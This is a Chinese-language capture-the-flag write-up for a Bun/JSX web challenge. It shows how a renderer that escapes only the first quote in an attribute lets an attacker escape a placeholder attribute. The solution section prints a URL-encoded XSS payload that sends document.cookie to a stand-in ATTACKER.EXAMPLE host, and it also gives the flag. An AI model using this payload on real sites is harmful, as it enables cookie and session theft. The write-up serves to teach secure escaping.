# Ruler of the Universe

## 题目简述

站点使用 Bun 和一套自制 JSX 渲染器。模块页面把查询参数 `message` 写入 `<input>` 的 `placeholder`，管理员机器人会携带可由 JavaScript 读取的 flag cookie 访问用户提交的站内路径。目标是构造存储在 URL 中的 XSS，让管理员浏览器把 cookie 发送到自己的接收端。

## 解题过程

路由 `/module/:id` 直接读取参数：

```typescript
const crewMessage = new URL(req.url).searchParams.get("message");
return render(<Module id={moduleId} crewMessage={crewMessage} />);
```

组件把它拼进属性值：

```tsx
placeholder={
  crewMessage
    ? `Update your message: ${crewMessage}`
    : "Enter a message for the crew"
}
```

子节点文本最终会调用 Bun 的 `escapeHTML()`，但自制渲染器对属性采用了不同逻辑：

```typescript
return `${key}="${String(value).replace('"', "&quot;")}"`;
```

`String.prototype.replace()` 在这里没有全局正则，只替换第一个双引号。输入两个连续双引号时，第一个变为 `&quot;`，第二个仍能闭合 `placeholder` 属性；随后用 `>` 结束标签并插入脚本。可提交给管理员机器人的路径为：

```text
module/0?message=%22%22%3E%3Cscript%3Efetch%28%27https%3A%2F%2FATTACKER.EXAMPLE%2F%3Fcookie%3D%27%2Bdocument.cookie%29%3C%2Fscript%3E
```

URL 解码后的关键部分是：

```html
""><script>fetch('https://ATTACKER.EXAMPLE/?cookie='+document.cookie)</script>
```

管理员机器人会把提交的 `url_part` 拼到本题站点根地址，设置名为 `flag` 的 cookie，然后用 Puppeteer 访问。源码中该 cookie 的 `httpOnly` 为 `false`，所以脚本可读取 `document.cookie`。在自己的 HTTP 请求接收端观察到请求参数后即可得到：

```text
uiuctf{maybe_i_should_just_use_react_c49b79}
```

## 方法总结

- 核心技巧：利用自制 JSX 渲染器只转义第一个引号的缺陷逃逸 HTML 属性，再借管理员机器人窃取非 HttpOnly cookie。
- 识别信号：同一渲染器分别处理文本节点和属性，且属性转义使用单次 `replace()`，说明不能把“有 HTML 转义”直接等同于上下文安全。
- 复用要点：XSS payload 必须匹配所在上下文；同时检查机器人 URL 拼接、cookie 域、`secure` 与 `httpOnly`，否则本地弹窗成功也未必能取得目标 cookie。
